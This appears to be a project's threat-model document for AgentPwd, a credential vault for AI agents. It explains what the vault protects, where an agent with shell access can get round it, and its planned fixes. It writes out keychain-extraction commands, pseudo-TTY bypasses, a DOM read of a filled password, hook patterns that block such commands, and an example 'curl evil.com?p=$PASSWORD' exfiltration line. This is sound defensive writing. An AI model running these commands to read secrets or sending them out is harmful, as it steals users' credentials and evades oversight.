# Threat Model

A frank account of what AgentPwd v1 defends against, and what it doesn't.

## What we protect

| Asset | Where it lives | Protected from |
|---|---|---|
| Credential plaintext (password, TOTP seed) | Decrypted in agentpwd's process memory only, for the duration of one operation | The LLM context — no MCP tool ever returns plaintext to the agent |
| Encrypted credentials | SQLite at `~/.agentpwd/vault.db`, AES-256-GCM with per-entry random nonces | Casual disk reads (encrypted), other users on the box (file perms `0700`) |
| Per-vault master key | OS keychain — macOS Keychain / Linux Secret Service / Windows Credential Manager | Disk theft, backup leaks, random other apps that don't have ACL grants (mac) |

The MCP layer is the load-bearing defense **against the agent itself**. Every credential-using tool is shaped as "do something with credential X" (fill a form, inject as env var, generate a TOTP) — never "give me credential X". The agent receives `{status: "success"}`, the plaintext flows out-of-band to the injection target.

## What we don't protect (the agent-with-shell-access problem)

If the agent has arbitrary shell execution (which Claude Code, Cursor, OpenCode, and most others do), it can bypass the MCP layer and read the master key directly:

```bash
# Read the master key from macOS keychain
security find-generic-password -s agentpwd -a <vault_id> -w

# Or via Node + keytar (the same library agentpwd uses)
node -e "require('keytar').getPassword('agentpwd', '<vault_id>').then(console.log)"

# Or just read the SQLite DB and decrypt with the key it just exfiltrated
```

The OS keychain helps less than you'd hope here:

| OS | Per-process isolation | What stops the attack |
|---|---|---|
| **macOS** | Per-binary ACL on keychain entries | One-time prompt when a new binary asks. But once the user clicks *Always Allow* for Node, any Node script reads transparently. |
| **Linux** | No per-binary ACL (Secret Service is shared session-wide) | Nothing — the attack works |
| **Windows** | DPAPI scoped to user account | Nothing — the attack works for any process running as the user |

**This is the same problem every local password manager has.** 1Password's local vault, Bitwarden CLI's session, dotenv files — all of them assume the user's processes are trustworthy. AgentPwd inherits the same assumption.

## v1 mitigations

These don't *prevent* the attack — they raise the cost, slow it down, or detect it after the fact:

1. **MCP tool design** — the *intended* path never returns plaintext. The attack requires the agent to deliberately go off-path (write+exec a script, call `security`, etc.). Off-path behavior is louder and more flagrantly out-of-character than calling a sanctioned tool.

2. **Audit log** — every `decryptCredential` call is recorded in `~/.agentpwd/vault.db` (timestamp, credential ID, action — never the value). `ap audit` shows it. Pattern: 100 reads in 10 seconds → something's off.

3. **No plaintext reveal path in the CLI** — there is deliberately no `ap show` command in v1. A TTY check (`stdin.isTTY`) was considered and rejected: it's trivially bypassed by any agent that wraps the command in a pseudo-TTY (`script -q /dev/null ap show ...`, `python -c "pty.spawn(...)"`, `socat ... pty`, etc.) — so it would be fake security, worse than no protection because it advertises a guarantee it can't keep. A real human-only reveal path requires hardware-attested user presence (Touch ID / Windows Hello), which is deferred to v2.

4. **Output scrubbing** — `ap_run` (when it lands) redacts the password and common encodings (base64/hex/URL-encoded/reversed) from stdout/stderr before returning to the LLM. Best-effort, **not a boundary** — `ap_run` is a privileged escape hatch and any caller can defeat scrubbing with custom encoding.

5. **Claude Code hooks** *(documented, user-configured)* — `PreToolUse` hooks can block `Bash` commands matching `security find-generic-password`, `keytar`, or `agentpwd` patterns. Arms race (the agent can encode/obfuscate), but it adds a confirmation step. Example hook will ship in `hooks/` in a later PR.

## Filled-credential exposure window

Distinct threat from the keychain-extraction one above. After `ap_fill_login` or `ap_fill_field` injects a password into a form, the cleartext value lives — briefly — in three places:

1. `<input>.value` on the DOM element (readable from page JS: `document.querySelector('#pw').value`)
2. The accessibility tree (sometimes exposed to screen readers and CUI/computer-use models)
3. The form submission's request body (legitimate, unavoidable — that's the point)

**Pure vision is not the threat.** `<input type="password">` renders as `••••••••` in the viewport, so a vision model reading a screenshot of the page sees dots, not the password. Browser already protects this.

**DOM / accessibility reads are the threat.** An agent with code execution (Bash, CDP, browser-side JS) can read the `value` property even though it renders as dots. The window of exposure varies by tool:

| Tool | Exposure window |
|---|---|
| `ap_fill_login` | ~microseconds — fill + submit happen synchronously in one `Runtime.evaluate`; page typically navigates before the MCP call returns |
| `ap_fill_field` | Indefinite — the value sits in `input.value` until the agent (or user) submits the form elsewhere. Real risk if the agent yields control before submitting. |

### Techniques considered and discarded

We looked at several "blur the value at fill time" approaches. Most don't survive contact with the threat:

| Approach | Why it fails |
|---|---|
| Fill → submit → clear | Race condition: clearing before the form captures the value breaks the submission; clearing after still leaves a window for the agent. |
| Decoy fields / haystack | The real password field is the only `type=password` with the right semantic attrs. Trivially filtered. |
| Direct fetch/XHR to form action | Breaks CSRF rotation, MFA bridges, captcha-on-interaction, JS-driven login flows. Most modern sites stop working. |
| Clipboard paste trick | The pasted value ends up in `.value` exactly like typing. Plus password lingers in the clipboard. |
| Chrome native autofill API | `chrome.autofillPrivate` is only exposed to internal Chrome components, not user code. `navigator.credentials.get()` returns the password to JS — same problem. |
| Encoding/obfuscation at fill | We have to decode for submission; decoder runs in the page; agent reads the decoded value. |

### Mitigations shipped

1. **Block on navigation in `ap_fill_login`** — after clicking submit, the MCP tool blocks until the top-level frame navigates (CDP: `Page.frameNavigated` subscription; AppleScript: poll `window.location.href`) or a 5s timeout elapses. The agent cannot inspect the filled-but-not-submitted state because it's blocked waiting for our response. This shrinks the `ap_fill_login` exposure window to effectively zero on the happy path.

2. **Best-effort clear-after-timeout** — if no navigation fires within the timeout (login failed, SPA without URL change, slow server), the password field's `input.value` is set to `""` as cleanup. The submission already either fired or didn't; clearing post-hoc just removes the lingering DOM artifact for an agent that might read it.

3. **Stronger tool description on `ap_fill_field`** — the description now explicitly steers callers toward `ap_fill_login` whenever the page has a recognisable login form, and calls out that `ap_fill_field` does NOT submit (so the password persists in `input.value` until external submit). LLMs reliably follow tool descriptions, so this is a real mitigation, not a hint.

4. **Submission status surfaced** — `ap_fill_login` returns `{status, navigated}` where `navigated: true` means the page transitioned (safe outcome) and `navigated: false` means submit was clicked but the page didn't navigate (caller should treat as "may have failed", DOM was best-effort cleared). The caller can react instead of assuming success.

### What does NOT improve security materially

- **A Chrome extension at v1**: same trust boundary on the page. Even with isolated worlds for extension JS, the `input.value` it sets is still readable from page JS. The extension wins on cross-platform / no-debug-port-required, not on credential-leak protection.
- **Encrypted/obfuscated value at fill**: pure security theater. The page receives the cleartext at the moment of decode, which is the moment that matters.

## Roadmap — closing the gap

The architecturally correct fix is to **stop storing credentials on the agent's machine at all**. We're staging this in two cuts:

### v2.0 — hosted vault + remote browser only (the clean cut)

```
[Agent on local machine]
   │ JSON-RPC over HTTPS + API key
   │ ap_fill_login(credential_id="abc", cdp_url="wss://browserbase.com/...")
   ▼
[Hosted AgentPwd service]
   - holds encrypted vault (we never see plaintext at rest; decrypted in process memory only)
   - opens CDP WebSocket to cdp_url
   - sends Runtime.evaluate with the password
   ▼
[Remote browser session (Browserbase / Anchor / Browserless / OpenClaw managed)]
   - password is typed into the form
```

The agent receives `{status: "success"}`. **Its machine never touches the credential at any point** — no vault file, no master key, no in-flight plaintext. An agent with full shell access on its machine finds nothing decryptable because nothing came down. This is the same shape as a SaaS API; the credential ops are server-side.

Residual risks at this tier:

- **API key theft.** The agent's API key for the hosted service lives on the local machine. A compromised agent can steal it and call the service. But the API is shaped *fill, never reveal* — the worst the attacker can do with the token is trigger fills (visible) on domains that match the credential's site (enforced server-side via the same `domainMatches()` already in v1). They cannot extract plaintext.
- **Operator trust.** You're trusting us to actually never log plaintext, etc. Same trust model as Bitwarden / 1Password operator tiers.
- **Remote browser provider trust.** Browserbase/Anchor sees the value as part of the form rendering. Their security is your security for that operation. Same as v1.

### v2.1 — hosted vault + Chrome extension (local browser support)

For users who want to fill into their **own local Chrome** (Claude Code, Claude for Chrome, etc.), the hosted service can't reach `localhost` from the cloud. Two patterns exist:

- A local daemon that opens an outbound WebSocket to the hosted service → tunnels credentials back to local Chrome via CDP. **This doesn't actually protect against a local agent**: the daemon runs as the user's account, holds plaintext in memory briefly, and any process running as that user can read its memory (`ptrace`, `/proc`, etc.) or hijack the localhost CDP socket. Same trust zone as the agent.
- A **Chrome extension** as the bridge → meaningfully better. The extension lives *inside* Chrome:
  - Chrome runs with hardened runtime + code signing on macOS, sandboxed renderers everywhere. `lldb -p` on Chrome fails without specific entitlements on mac; harder on Linux/Windows but still a higher bar than a standalone Node process.
  - No CDP debug port exposed (the extension uses Chrome's internal `chrome.tabs` / content-script APIs, not the external CDP socket — so there's no localhost endpoint a sibling process can hijack).
  - The extension's auth token to the hosted service is stored in `chrome.storage.local` (readable from disk by the user). An agent that steals it can call the hosted service — but the API is *fill, never reveal*, and domain validation server-side prevents fills on attacker-controlled pages. Worst case: attacker triggers visible fills on legitimate domains, which is loud and accomplishes little.

```
[Agent on local machine]  ──ap_fill_login + cdp_url=local──>  [Hosted service]
                                                                      │
                                                                      ▼
[Local Chrome]  ◄──content script types into form──  [Our Chrome extension]
                                                              ▲
                                                              │  outbound WSS (TLS)
                                                              │
                                                       [Hosted service pushes fill commands]
```

Trade-offs of the extension: Chrome Web Store review cycle, manifest V3 service-worker constraints (offscreen documents / alarms workarounds), Chrome-family browsers only (no Firefox / Safari).

### Why we're not doing passphrase-derived keys

An earlier draft proposed deriving the master key from a passphrase the user enters per session. We dropped it: it still requires the plaintext key to live on the agent's machine *during the session* (so a co-resident agent can still extract it), and adds significant friction. The hosted model is both stronger (no credential ever reaches the local machine for remote-browser flows) and a cleaner product shape.

### Timeline

v2.x is gated on traction signal from the v1 OSS launch. Order of work when we start: v2.0 (hosted service + remote-browser flow) → v2.1 (Chrome extension for local browser). Self-hosted users stay on the v1 trust model.

## What we explicitly DO NOT claim

- AgentPwd does not protect a fully-rooted machine. If an attacker has shell access AND the user has clicked through any keychain prompts, the game is over for local-only password managers, including this one.
- AgentPwd does not protect against a *user* deliberately misusing the tool (e.g., asking the agent to `ap_run "curl evil.com?p=$PASSWORD"`). Tool descriptions warn the LLM but `ap_run` is fundamentally a privileged escape hatch.
- AgentPwd does not (yet) protect against a remote browser provider (Browserbase, Anchor) being compromised. Once you pass them a `cdp_url`, the password is rendered into the form on their infrastructure. Their security is your security for that operation.

If you find a case we should add to this list, file an issue.
